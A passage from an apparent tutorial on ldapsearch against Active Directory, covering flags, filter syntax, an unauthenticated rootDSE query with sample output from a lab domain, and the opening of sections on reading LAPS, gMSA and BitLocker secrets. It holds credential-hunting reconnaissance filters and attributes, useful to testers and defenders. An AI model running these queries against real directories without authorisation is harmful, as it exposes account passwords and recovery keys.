&lt;li&gt;&lt;code&gt;-x&lt;/code&gt; Basic Authentication, you usually use this if you are going to include a username and password (instead of something like a kerberos ticket)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-h&lt;/code&gt; IP address or hostname&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-H&lt;/code&gt; URL to force protocol and/or add port number &lt;code&gt;-H ldaps://dc1.b.com&lt;/code&gt; or &lt;code&gt;-H ldaps://dc1.b.com:6636&lt;/code&gt; (636 is the default port for LDAPS, but can be connected to on 389 and is sometimes found with an additional 6 in the front as shown). &lt;code&gt;3269&lt;/code&gt; is the Global Catalog port and can also accept LDAPS queries sometimes (you may have to ignore cert errors for this to work, depending on your setup).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-b&lt;/code&gt; Base, generally this is Distinguished Name format for example &lt;code&gt;dc=google,dc=com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-D&lt;/code&gt; Username and Domain (not FQDN) &lt;code&gt;&amp;quot;sittingduck\uberuser&amp;quot;&lt;/code&gt;. For maximum Kerberos based authentication you can also specify your user in &lt;code&gt;uberuser@SITTINGDUCK.INFO&lt;/code&gt; form, but ldapsearch will auto user the current user in Kerberos tickets available, so this can be omitted&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-LLL&lt;/code&gt; This removes all of the extra log output of the search&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-Y GSSAPI&lt;/code&gt; Used for Kerberos based authentication, however this is on by default and not needed (if installed), but you can specify it just to test to see if SASL is installed. &lt;code&gt;apt install libsasl2-modules-gssapi-mit&lt;/code&gt; if it isn&amp;rsquo;t. Once installed, you do not need to keep this on the command line.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-E&lt;/code&gt; is for &lt;a href=&#34;https://ldapwiki.com/wiki/LDAPControlsList&#34;&gt;extended controls&lt;/a&gt; which are generally OIDs, but can also be:&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-E pr=1000/noprompt&lt;/code&gt; By default &lt;code&gt;ldapsearch&lt;/code&gt; will pull 1000 records maximum. Adding this it will pull 1000 records at a time until it has printed all results to the screen.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-O minssf=0,maxssf=0&lt;/code&gt; This option will fix some errors during SASL (Kerberos) authentication. Technically this shouldn&amp;rsquo;t do anything based on the RFC, but it&amp;rsquo;s essentially telling the LDAP protocol that there isn&amp;rsquo;t a min or a max size for the authentication packets.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-o ldif-wrap=no&lt;/code&gt; This options makes the output non-wrapped, which is the best format to pull out things like certificates and other very long strings.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-W&lt;/code&gt; and &lt;code&gt;-w&lt;/code&gt; - &lt;code&gt;-W&lt;/code&gt; will prompt for the password, with &lt;code&gt;-w&lt;/code&gt; you can specify the password on the command line. If you do not specify one of these &lt;code&gt;ldapsearch&lt;/code&gt; will assume no password for the account. You can lock accounts out this way.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LDAPTLS_REQCERT=never ldapsearch {arguments}&lt;/code&gt; This is used when you are connecting to a self signed, or SSL enabled LDAP that your system cannot verify the certificate for.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-N&lt;/code&gt; Do not try to have the host name of your target DC attempted to perform a reverse DNS on the IP to match them. This is needed when the Domain Controller doesn&amp;rsquo;t have a valid reverse DNS record from your standpoint on the network and you are using Kerberos.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ldap-search-filters&#34;&gt;LDAP Search Filters&lt;/h3&gt;
&lt;p&gt;After the arguments comes the filter, then the attributes. Filters are like search terms. For example &lt;code&gt;&amp;quot;(ms-Mcs-AdmPwdExpirationTtime=*)&amp;quot;&lt;/code&gt; is a search that says if the LDAP object has the &lt;code&gt;ms-Mcs-AdmPwdExpirationTtime&lt;/code&gt; attribute and it&amp;rsquo;s not empty. LDAP filters are a bit odd, as they need to be within parentheses completely. In order to do a search for &lt;code&gt;x&lt;/code&gt; AND &lt;code&gt;y&lt;/code&gt; you have to do something like this &lt;code&gt;(&amp;amp;(x=*)(y=*))&lt;/code&gt;. This search says only return results that have &lt;code&gt;x&lt;/code&gt; and &lt;code&gt;y&lt;/code&gt; and both are not empty. Here is a real world example:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;(&amp;amp;(&amp;amp;(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This says all objects that have &lt;code&gt;servicesPrincipalName&lt;/code&gt; attributes, it is a normal account (512) &lt;a href=&#34;https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties&#34;&gt;see more here&lt;/a&gt; AND is NOT &lt;code&gt;!&lt;/code&gt;  disabled (2).&lt;/p&gt;
&lt;p&gt;Note: &lt;code&gt;1.2.840.113556.1.4.803&lt;/code&gt; is an LDAP feature that says &lt;code&gt;LDAP_MATCHING_RULE_BIT_AND&lt;/code&gt; which is basically a bitwise &lt;code&gt;AND&lt;/code&gt;. For example, a standard user account is &lt;code&gt;512&lt;/code&gt; but would be &lt;code&gt;514&lt;/code&gt; if disabled, but a computer account is &lt;code&gt;4096&lt;/code&gt; and &lt;code&gt;4098&lt;/code&gt; if disabled. Used the bitwise function you can account for both scenarios since it&amp;rsquo;s looking in the &lt;code&gt;2&lt;/code&gt; binary location.&lt;/p&gt;
&lt;p&gt;Everything after the filter is selection of attributes. (also known as &amp;ldquo;parameters&amp;rdquo; if you are used to Powershell and AD Objects)&lt;/p&gt;
&lt;h3 id=&#34;interesting-attributes&#34;&gt;Interesting Attributes&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;msDS-Approx-Immed-Subordinates&lt;/code&gt; - Gives you a count of objects directly below the specified &amp;ldquo;Base&amp;rdquo; &lt;code&gt;-b&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NTSecurityDescriptor&lt;/code&gt; - This is the SDSF in binary and base64 format, and will only be displayed if you request it specifically for the object.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msDS-ManagedPassword&lt;/code&gt; - This is a at-runtime built attribute that is the current NT hash of the Group Managed Service Account GMSA. &lt;strong&gt;!WARNING!&lt;/strong&gt; See below before querying.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msFVE-RecoveryPassword&lt;/code&gt; - This is also an at-runtine built attribute that is the current BitLocker secret key for the computer account you query. &lt;strong&gt;!WARNING!&lt;/strong&gt; See below before querying.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;null-session-starting&#34;&gt;Null Session Starting&lt;/h3&gt;
&lt;p&gt;This can be done without any authentication and will give you a ton of information about the LDAP server in question (usually Active Directory):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.100 -x -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -s base &lt;span style=&#34;color:#ae81ff&#34;&gt;\*&lt;/span&gt; +
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;example-output&#34;&gt;Example Output&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# extended LDIF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# LDAPv3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# base &amp;lt;&amp;gt; with scope baseObject&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# requesting: * + &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;currentTime: 20220513212748.0Z
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;subschemaSubentry: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Aggregate,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; nfo
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dsServiceName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;NTDS Settings,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC2,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,C
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; N&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DomainDnsZones,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;namingContexts: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ForestDnsZones,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;defaultNamingContext: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;schemaNamingContext: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Schema,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;configurationNamingContext: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rootDomainNamingContext: DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.319
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.801
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.473
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.528
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.417
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.619
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.841
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.529
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.805
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.521
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.970
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1338
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.474
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1339
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1340
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1413
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 2.16.840.1.113730.3.4.9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 2.16.840.1.113730.3.4.10
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1504
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1852
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.802
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1907
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1948
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1974
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.1341
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2026
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2064
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2065
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2066
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2090
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2205
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2204
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2206
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2211
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2239
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2255
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedControl: 1.2.840.113556.1.4.2256
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPVersion: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPVersion: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxPoolThreads
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxPercentDirSyncRequests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxDatagramRecv
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxReceiveBuffer
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: InitRecvTimeout
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxConnections
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxConnIdleTime
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxPageSize
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxBatchReturnMessages
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxQueryDuration
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxTempTableSize
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxResultSetSize
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MinResultSets
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxResultSetsPerConn
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxNotificationPerConn
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxValRange
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: MaxValRangeTransitive
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: ThreadMemoryLimit
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedLDAPPolicies: SystemMemoryLimitPercent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;highestCommittedUSN: &lt;span style=&#34;color:#ae81ff&#34;&gt;2830648&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: GSSAPI
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: GSS-SPNEGO
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: EXTERNAL
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedSASLMechanisms: DIGEST-MD5
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dnsHostName: dc2.sittingduck.info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ldapServiceName: sittingduck.info:dc2$@SITTINGDUCK.INFO
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;serverName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC2,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Default-First-Site-Name,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Sites,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configura
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; tion,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.800
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.1670
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.1791
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.1935
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.2080
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;supportedCapabilities: 1.2.840.113556.1.4.2237
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isSynchronized: TRUE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isGlobalCatalogReady: TRUE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domainFunctionality: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;forestFunctionality: &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domainControllerFunctionality: &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# search result&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;result: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Success
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# numResponses: 2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# numEntries: 1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can learn the &lt;code&gt;dnsHostName&lt;/code&gt; of the LDAP server you pinged, the &lt;code&gt;dn&lt;/code&gt; which is useful for picking your base search if you don&amp;rsquo;t know it, the &lt;code&gt;domainFunctionality&lt;/code&gt; level (aka the &lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6dd88965-8feb-4369-ae7e-075985da8071&#34;&gt;Domain Functional Level&lt;/a&gt;) will give you a sense of what capabilities and GPOs can be set. The &lt;code&gt;supportedControl&lt;/code&gt; and &lt;code&gt;supportedCapabilities&lt;/code&gt; are more advanced topics, but these basically say what you can and can&amp;rsquo;t do on the server.&lt;/p&gt;
&lt;h2 id=&#34;interesting-searches&#34;&gt;Interesting Searches&lt;/h2&gt;
&lt;p&gt;The following are searches that I&amp;rsquo;ve found interesting or impactful in my experience.&lt;/p&gt;
&lt;h3 id=&#34;laps-passwords&#34;&gt;LAPs Passwords&lt;/h3&gt;
&lt;p&gt;This search will only show computers with LAPs enabled, and if you can read any passwords, what the password currently is.&lt;/p&gt;
&lt;p&gt;Notice that this user can read every password except &lt;code&gt;SDLEGACY2K3&lt;/code&gt; and &lt;code&gt;SDEXCHANGE&lt;/code&gt;&lt;/p&gt;
